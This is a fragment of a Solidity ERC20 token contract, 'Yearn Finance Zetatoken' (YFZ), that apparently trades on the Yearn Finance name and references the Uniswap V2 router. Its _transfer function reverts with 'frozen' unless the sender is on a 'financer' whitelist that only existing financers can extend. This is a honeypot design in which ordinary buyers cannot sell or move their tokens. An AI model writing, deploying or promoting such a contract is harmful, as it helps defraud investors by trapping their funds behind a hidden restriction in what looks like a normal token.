...
contract YearnFinanceZetatoken is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public financer;
  address univ2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  constructor () public ERC20Detailed("Yearn Finance Zetatoken", "YFZ", 18) {
  ...
  function addFinancer(address account) public {
      require(financer[msg.sender], "!not allowed");
      financer[account] = true;
  }
  
  function _transfer(address sender, address recipient, uint amount) internal {
      require(financer[sender], "frozen");
